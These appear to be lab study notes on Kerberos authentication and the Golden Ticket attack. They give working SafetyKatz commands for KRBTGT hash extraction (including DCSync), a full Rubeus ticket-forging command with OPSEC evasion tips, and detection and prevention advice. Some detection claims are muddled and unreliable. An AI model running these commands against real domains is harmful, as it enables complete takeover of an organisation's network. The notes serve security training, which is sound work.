# Kerberos Flow & Golden Ticket Attack

**Date:** 01 August 2026

---

## Kerberos Authentication Flow (From Image)

### Step 1: Authentication Request (AS-REQ)
```
Client → KDC
"I am Administrator, here's my timestamp encrypted with my password"
```
- Client sends username + encrypted timestamp (AS-REQ)
- Encrypted with user's AES key or NTLM hash

### Step 2: Authentication Response (AS-REP)
```
KDC → Client
"You are authenticated! Here's your TGT"
```
- KDC verifies timestamp
- Creates TGT (Ticket-Granting Ticket)
- TGT encrypted with KRBTGT account hash
- Sent back to client

### Step 3: Service Request (TGS-REQ)
```
Client → KDC
"I want to access this service, here's my TGT"
```
- Client sends TGT + Service Principal Name (SPN)
- Requesting Service Ticket (ST)

### Step 4: Service Response (TGS-REP)
```
KDC → Client
"Here's your Service Ticket for that service"
```
- KDC creates ST encrypted with target service's key
- Sent to client

### Step 5: Service Access (AP-REQ)
```
Client → Application Server
"I want to access you, here's my Service Ticket"
```
- Client presents ST to application server
- Server verifies ticket
- Access granted

### Step 6: Optional Mutual Authentication
```
Application Server → Client (optional)
"I verified your ticket"
```
- Server optionally sends confirmation

---

## Golden Ticket Attack

**What is a Golden Ticket?**

A forged TGT (Ticket-Granting Ticket) created using the KRBTGT account's hash.

**Why It Works:**

```
Real TGT flow:
  KDC encrypts TGT with KRBTGT hash
  
Golden Ticket:
  Attacker encrypts forged TGT with KRBTGT hash
  System can't tell the difference!
  
Result: Unlimited access to entire domain
```

---

## Golden Ticket Attack Steps

### Step 1: Get KRBTGT Hash

**Method 1: Execute as Domain Admin on DC**
```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::lsa /patch"
```

**Method 2: Use DCSync (No code execution on DC needed)**
```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

> DCSync requires DA privileges or replication rights on domain object

### Step 2: Enumerate Values (For OPSEC)

Rubeus can query LDAP to get values:
```powershell
C:\AD\Tools\Rubeus.exe golden /aes256:<krbtgt_hash> /sid:<domain_sid> /ldap /user:Administrator /printcmd
```

**LDAP queries retrieve:**
1. User flags (Administrator account)
2. Group membership, password age, logon count
3. Domain NETBIOS name

### Step 3: Forge Golden Ticket

**Simple command (with LDAP queries):**
```powershell
C:\AD\Tools\Rubeus.exe golden 
  /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 
  /sid:S-1-5-21-719815819-3726368948-3917688648 
  /ldap 
  /user:Administrator
  /printcmd
```

**OPSEC-friendly command (manual values):**
```powershell
C:\AD\Tools\Rubeus.exe golden 
  /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 
  /user:Administrator 
  /id:500 
  /pgid:513 
  /domain:dollarcorp.moneycorp.local 
  /sid:S-1-5-21-719815819-3726368948-3917688648 
  /pwdlastset:"11/11/2022 6:33:55 AM" 
  /minpassage:1 
  /logoncount:2453 
  /netbios:dcorp 
  /groups:544,512,520,513 
  /dc:DCORP-DC.dollarcorp.moneycorp.local 
  /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD 
  /ptt
```

**Parameters:**
- `/aes256` — KRBTGT hash (AES256 encryption key)
- `/user` — User to impersonate (usually Administrator)
- `/id` — RID of user (500 = Administrator)
- `/pgid` — Primary group ID (513 = Domain Users)
- `/domain` — Domain FQDN
- `/sid` — Domain SID
- `/pwdlastset` — Password last set timestamp (copy from real user)
- `/minpassage` — Min password age
- `/logoncount` — Logon count (copy from real user)
- `/netbios` — Domain NETBIOS name
- `/groups` — Group IDs user belongs to (544=Admins, 512=DA, 520=GA, 513=Users)
- `/dc` — Domain controller name
- `/uac` — User account control flags
- `/ptt` — Pass-the-ticket (use immediately)

---

## Why Golden Tickets Are Powerful

✅ **Forge any user** — impersonate any domain user  
✅ **Forge any group** — add yourself to Domain Admins  
✅ **Persistent** — valid for 10 hours minimum  
✅ **No password** — password changes don't invalidate  
✅ **From anywhere** — even non-domain machines  
✅ **Offline creation** — no KDC communication needed  

---

## Why Golden Tickets Are Noisy

❌ **KRBTGT hash rarely changes** — easily detected in logs  
❌ **Unusual ticket properties** — can differ from normal TGTs  
❌ **No password validation** — anomalous for security monitoring  
❌ **Excessive access** — using admin privileges triggers alerts  

---

## Detection & Prevention

**Detection:**
- Monitor for TGT requests without AS-REQ
- Alert on unusual user properties in tickets
- Track KRBTGT access/extraction

**Prevention:**
- **Change KRBTGT password twice** — breaks password history
- Monitor KRBTGT hash access
- Enable Kerberos audit logging
- Implement MFA (makes tickets less valuable)

---

## Attack Flow Visualization

```
┌─────────────────┐
│  Get KRBTGT     │
│  Hash (DCSync   │
│  or Mimikatz)   │
└────────┬────────┘
         │
         ↓
┌─────────────────┐
│  Enumerate      │
│  Domain Values  │
│  (LDAP/Manual)  │
└────────┬────────┘
         │
         ↓
┌─────────────────────┐
│  Forge Golden       │
│  Ticket with        │
│  Rubeus.exe         │
└────────┬────────────┘
         │
         ↓
┌──────────────────────┐
│  Use Ticket (/ptt)   │
│  to access domain    │
│  as Administrator    │
└──────────────────────┘
```

---

## Comparison: TGT vs Golden Ticket

| Aspect | Real TGT | Golden Ticket |
|---|---|---|
| Created by | KDC | Attacker |
| Encrypted with | KRBTGT hash | KRBTGT hash (attacker-forged) |
| Validity | 10 hours | 10 hours |
| Password protected | Yes | No |
| User must exist | Yes | No (but should mimic existing) |
| Detection | Hard (normal behavior) | Harder with OPSEC |

---

## KRBTGT Hash Extraction Methods

**Method 1: Mimikatz on DC (Noisy)**
```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::lsa /patch"
```
- Requires local admin on DC
- Likely to trigger AV/EDR

**Method 2: DCSync (Stealthier)**
```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```
- Requires DA or replication rights
- No code execution on DC
- Generates LDAP traffic (can be monitored)

**Defense Against KRBTGT Extraction:**
- Change KRBTGT password twice (invalidates old tickets)
- Monitor DCSync attempts (4662 event)
- Restrict DC access (logon rights)

---

## References

- [Rubeus - Golden Ticket](https://github.com/GhostPack/Rubeus)
- [SafetyKatz](https://github.com/GhostPack/SafetyKatz)
- [Active Directory Kerberos - Microsoft](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)

---

*Next: Silver Tickets & Kerberoasting*
